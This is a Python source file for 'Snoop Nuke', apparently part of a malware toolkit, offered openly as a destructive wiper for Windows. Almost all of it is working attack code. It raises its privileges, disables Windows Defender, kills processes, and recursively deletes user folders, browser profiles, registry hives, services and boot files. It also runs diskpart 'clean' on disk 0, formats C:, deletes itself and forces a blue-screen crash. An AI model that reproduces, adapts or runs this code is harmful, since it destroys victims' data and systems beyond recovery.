# Snoop Nuke – SNOOP Ultimate Destruction Module
import os
import sys
import shutil
import subprocess
import time
import random
import ctypes
import winreg
import threading
import tempfile
from pathlib import Path

def run_nuke():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            try:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
                sys.exit()
            except:
                pass

        print("[SNOOP] Initialisation du Nuke...")

        def kill_processes():
            targets = ["chrome", "firefox", "discord", "steam", "explorer", "taskmgr", "regedit", "cmd", "powershell"]
            for proc in targets:
                try:
                    subprocess.run(f"taskkill /f /im {proc}.exe", shell=True, capture_output=True)
                except:
                    pass

        def delete_files():
            paths = [
                os.path.expanduser("~") + "\\Desktop",
                os.path.expanduser("~") + "\\Documents",
                os.path.expanduser("~") + "\\Downloads",
                os.path.expanduser("~") + "\\Pictures",
                os.path.expanduser("~") + "\\Videos",
                os.path.expanduser("~") + "\\Music",
                os.getenv("APPDATA"),
                os.getenv("LOCALAPPDATA"),
                os.getenv("TEMP"),
                "C:\\ProgramData",
                "C:\\Users\\Public"
            ]
            for base in paths:
                if os.path.exists(base):
                    try:
                        shutil.rmtree(base, ignore_errors=True)
                    except:
                        pass

        def corrupt_registry():
            try:
                subprocess.run("reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /va /f", shell=True)
                subprocess.run("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /va /f", shell=True)
                subprocess.run("reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager /v BootExecute /f", shell=True)
            except:
                pass

        def delete_system_files():
            critical = [
                "C:\\Windows\\System32\\config\\SAM",
                "C:\\Windows\\System32\\config\\SYSTEM",
                "C:\\Windows\\System32\\config\\SOFTWARE",
                "C:\\Windows\\System32\\config\\SECURITY",
                "C:\\boot.ini",
                "C:\\bootmgr",
                "C:\\Windows\\System32\\winload.exe",
                "C:\\Windows\\System32\\winload.efi"
            ]
            for f in critical:
                try:
                    if os.path.exists(f):
                        os.remove(f)
                except:
                    pass

        def create_destruction_script():
            script = os.path.join(tempfile.gettempdir(), "nuke.bat")
            with open(script, "w") as f:
                f.write("""
@echo off
echo Destruction en cours...
del /f /s /q C:\\*.* > nul 2>&1
rmdir /s /q C:\\Windows > nul 2>&1
rmdir /s /q C:\\ProgramData > nul 2>&1
rmdir /s /q C:\\Users > nul 2>&1
format C: /y /q > nul 2>&1
diskpart /s %temp%\\diskpart.txt
echo "System destroyed."
shutdown /s /f /t 3
""")
            dp = os.path.join(tempfile.gettempdir(), "diskpart.txt")
            with open(dp, "w") as f:
                f.write("select disk 0\\nclean all\\nexit")
            return script

        def disable_defender():
            try:
                subprocess.run('powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True)
                subprocess.run('powershell -c "Set-MpPreference -DisableBehaviorMonitoring $true"', shell=True)
                subprocess.run('powershell -c "Set-MpPreference -DisableBlockAtFirstSeen $true"', shell=True)
                subprocess.run('powershell -c "Set-MpPreference -DisableIOAVProtection $true"', shell=True)
                subprocess.run('powershell -c "Set-MpPreference -DisablePrivacyMode $true"', shell=True)
                subprocess.run('powershell -c "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"', shell=True)
                subprocess.run('powershell -c "Set-MpPreference -DisableArchiveScanning $true"', shell=True)
                subprocess.run('powershell -c "Set-MpPreference -DisableIntrusionPreventionSystem $true"', shell=True)
                subprocess.run('powershell -c "Set-MpPreference -DisableScriptScanning $true"', shell=True)
                subprocess.run('powershell -c "Set-MpPreference -SubmitSamplesConsent 2"', shell=True)
            except:
                pass

        def delete_browser_data():
            browsers = [
                os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data",
                os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data",
                os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data",
                os.getenv("APPDATA") + "\\Opera Software\\Opera Stable",
                os.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles"
            ]
            for path in browsers:
                if os.path.exists(path):
                    try:
                        shutil.rmtree(path, ignore_errors=True)
                    except:
                        pass

        def corrupt_mbr():
            try:
                subprocess.run("diskpart /s %temp%\\mbr.txt", shell=True)
                mbr = os.path.join(tempfile.gettempdir(), "mbr.txt")
                with open(mbr, "w") as f:
                    f.write("select disk 0\\nclean\\nexit")
                subprocess.run(f"diskpart /s {mbr}", shell=True)
            except:
                pass

        def trigger_bsod():
            try:
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
            except:
                pass

        def delete_all_services():
            try:
                services = subprocess.check_output("sc query state= all", shell=True).decode(errors='ignore')
                for line in services.splitlines():
                    if "SERVICE_NAME:" in line:
                        name = line.split(":")[1].strip()
                        if name not in ["Windows", "System", "EventLog", "PlugPlay"]:
                            subprocess.run(f"sc delete {name}", shell=True, capture_output=True)
            except:
                pass

        def destroy_network():
            try:
                subprocess.run("netsh int ip reset", shell=True)
                subprocess.run("netsh advfirewall reset", shell=True)
                subprocess.run("netsh winsock reset", shell=True)
                subprocess.run("ipconfig /flushdns", shell=True)
                subprocess.run("ipconfig /release", shell=True)
                subprocess.run("ipconfig /renew", shell=True)
            except:
                pass

        def delete_boot_config():
            try:
                subprocess.run("bcdedit /set {default} recoveryenabled No", shell=True)
                subprocess.run("bcdedit /set {default} bootstatuspolicy ignoreallfailures", shell=True)
                subprocess.run("bcdedit /delete {default}", shell=True)
            except:
                pass

        def final_destruction():
            script = create_destruction_script()
            try:
                subprocess.Popen(script, creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
            try:
                os.remove(__file__)
            except:
                pass
            try:
                if os.path.exists(sys.argv[0]):
                    os.remove(sys.argv[0])
            except:
                pass
            trigger_bsod()

        print("[SNOOP] Phase 1: Arrêt des processus...")
        kill_processes()
        time.sleep(1)

        print("[SNOOP] Phase 2: Désactivation Defender...")
        disable_defender()
        time.sleep(1)

        print("[SNOOP] Phase 3: Suppression des données...")
        delete_files()
        delete_browser_data()
        time.sleep(1)

        print("[SNOOP] Phase 4: Corruption du registre...")
        corrupt_registry()
        delete_all_services()
        time.sleep(1)

        print("[SNOOP] Phase 5: Suppression des fichiers système...")
        delete_system_files()
        delete_boot_config()
        time.sleep(1)

        print("[SNOOP] Phase 6: Destruction réseau...")
        destroy_network()
        time.sleep(1)

        print("[SNOOP] Phase 7: Corruption MBR...")
        corrupt_mbr()
        time.sleep(1)

        print("[SNOOP] Phase 8: Destructeur final...")
        final_destruction()

    except Exception as e:
        print(f"[SNOOP] Erreur: {e}")
        try:
            subprocess.run("shutdown /s /f /t 0", shell=True)
        except:
            pass

if __name__ == "__main__":
    run_nuke()